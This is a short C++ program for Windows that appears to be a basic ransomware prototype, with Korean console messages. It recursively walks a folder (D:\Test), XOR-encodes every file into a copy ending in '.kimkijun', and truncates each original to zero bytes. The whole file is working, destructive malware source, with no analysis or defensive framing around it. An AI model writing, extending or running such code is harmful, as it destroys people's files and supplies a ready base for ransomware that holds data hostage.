#include <iostream>
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <fcntl.h>
#include <io.h>
#include <string>
#include <list>
#include <algorithm>

using namespace std;

class File
{
private:
	string CName;
	int i;
	FILE* OpenFile = nullptr;
	FILE* WriteFile = nullptr;

public:
	File()
	{
		cout << "start" << endl;
	}

	string setpath(string work, string rawpath)
	{
		work += rawpath;
		return work;
	}

	list<string> dirList(string startpath)
	{
		list<string>  list1;
		list<string>::iterator itor;
		itor = list1.begin();

		string path = startpath + "\\*.*";

		struct _finddata_t fd;

		intptr_t handle;

		if ((handle = _findfirst(path.c_str(), &fd)) == -1L)
			cout << "No file in directory!" << endl;

		while (_findnext(handle, &fd) == 0)
		{
			cout << fd.name << endl;
			if (string(fd.name)=="..")
				continue;
			else
				list1.push_back(setpath(startpath+"\\", fd.name));
		}

		_findclose(handle);

		in(list1);

		return list1;
	}

	void in(list<string> TargetList)
	{
		for(const auto var:TargetList)
		{
			OpenFile = fopen(var.c_str(), "rb");

			cout << "암호화 할 파일명" << var.c_str() << endl;

			if (OpenFile == nullptr)
			{
				cout << endl << endl << "다른 폴더로 !!" << endl << endl;

				cout << var << "파일이 존재하지 않습니다." << endl;
				dirList(var);
			}
			else
			{
				CName = var + ".kimkijun";
				cout << "암호화된 파일명 : " << CName << endl;
				WriteFile = fopen(CName.c_str(), "w+b");

				while ((i = fgetc(OpenFile)) != EOF)
				{
					i ^= 69;
					fputc(i, WriteFile);
				}

				fclose(OpenFile);

				FILE * initialStream = fopen(var.c_str(), "w+");
				fclose(initialStream);

				fclose(WriteFile);
			}
		}
	}

};


int main(void)
{
	File a;
	a.dirList("D:\\Test");
	return 0;
}